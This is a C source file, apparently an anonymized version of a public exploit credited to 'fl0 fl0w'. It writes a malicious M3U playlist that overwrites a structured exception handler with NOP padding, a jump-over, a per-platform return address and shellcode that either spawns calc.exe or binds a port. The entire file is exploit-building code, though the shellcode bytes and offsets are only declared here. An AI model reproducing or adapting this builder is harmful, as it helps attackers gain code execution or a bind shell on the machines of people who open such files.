#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct TYPE_2__ {char* platform; unsigned int addr; } ;
typedef  int /*<<< orphan*/  FILE ;

/* Variables and functions */
 int /*<<< orphan*/  M3Ufile ; 
 unsigned int NEXT_SEH ; 
 int /*<<< orphan*/  POST ; 
 char* PRE ; 
 unsigned int SEH_HANDLER ; 
 size_t FUNC0 (char*) ; 
 int /*<<< orphan*/  FUNC1 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/ * FUNC3 (int /*<<< orphan*/ ,char*) ; 
 int /*<<< orphan*/  FUNC4 (int /*<<< orphan*/ *,char*,char*,unsigned char*,int /*<<< orphan*/ ) ; 
 unsigned int* jmpover ; 
 scalar_t__ FUNC5 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC6 (unsigned char*,unsigned int*,unsigned int) ; 
 int /*<<< orphan*/  FUNC7 (unsigned char*,int,int) ; 
 int /*<<< orphan*/  FUNC8 (char*,...) ; 
 int /*<<< orphan*/  FUNC9 (char*,int*) ; 
 unsigned int* scz ; 
 unsigned int* scz2 ; 
 unsigned int FUNC10 (unsigned int*) ; 
 TYPE_1__* targets ; 

int FUNC11(int argc, char *argv[])
{ FILE *f;
  unsigned char *buffer;
  unsigned int offset=0;
  int i;
  if(argc < 2){
          FUNC8(" Credits for finding bug go to fl0 fl0w\n");
          FUNC8(" Exploit fl0 fl0w | Special Thanks to Expanders\n\n");
          FUNC8("#   \t Platform\n"); 
          FUNC8("-----------------------------------------------\n");
          for(i = 0; targets[i].platform; i++)
                FUNC8("%d \t %s\n",i,targets[i].platform);
          FUNC8("-----------------------------------------------\n");
          FUNC1(0);
  }
  FUNC8("{1} Spawn Calc.exe\n");
  FUNC8("{2} Bind port \n");
  unsigned int retaddress=targets[FUNC0(argv[1])].addr;
    int input;
    FUNC9("%d",&input);
    switch(input)
    { 
                 case 1: 
   buffer=(unsigned char*)FUNC5(SEH_HANDLER+4+FUNC10(scz)+1+16);
   if((f=FUNC3(M3Ufile,"wb"))==NULL) { FUNC8("Error ! file not created\n"); FUNC1(0); }
    
     FUNC8("Building file...\n");
     FUNC7(buffer,0x90,SEH_HANDLER+4+FUNC10(scz)+1+16);
     offset=NEXT_SEH;
       
     FUNC6(buffer+offset,jmpover,FUNC10(jmpover));  
     offset=SEH_HANDLER;  
     FUNC6(buffer+offset,&retaddress,4); offset+=4;
     offset+=16;
    
    FUNC6(buffer+offset,scz,FUNC10(scz));
    offset+=FUNC10(scz);
    FUNC7(buffer+offset,0x00,1);
    
                                  FUNC4(f,"%s%s%s",PRE,buffer,POST); 
                                  FUNC8("File build  :)  \n");
                                  FUNC2(f);
                 break;

                 case 2:
     buffer=(unsigned char*)FUNC5(SEH_HANDLER+4+FUNC10(scz2)+1+16);
     if((f=FUNC3(M3Ufile,"wb"))==NULL) { FUNC8("Error ! file not created\n"); FUNC1(0); }
     FUNC8("Building file...\n");
     FUNC7(buffer,0x90,SEH_HANDLER+4+FUNC10(scz2)+1+16);

     offset=NEXT_SEH;
     FUNC6(buffer+offset,jmpover,FUNC10(jmpover));  
    
     offset=SEH_HANDLER;  
     FUNC6(buffer+offset,&retaddress,4); offset+=4;
     offset+=16;
    
     FUNC6(buffer+offset,scz2,FUNC10(scz2));
     offset+=FUNC10(scz2);
     FUNC7(buffer+offset,0x00,1);
    
                                  FUNC4(f,"%s%s%s",PRE,buffer,POST); 
                                  FUNC8("File build  :)  \n");
                                  FUNC2(f);
                 break;
    }
return 0;
  }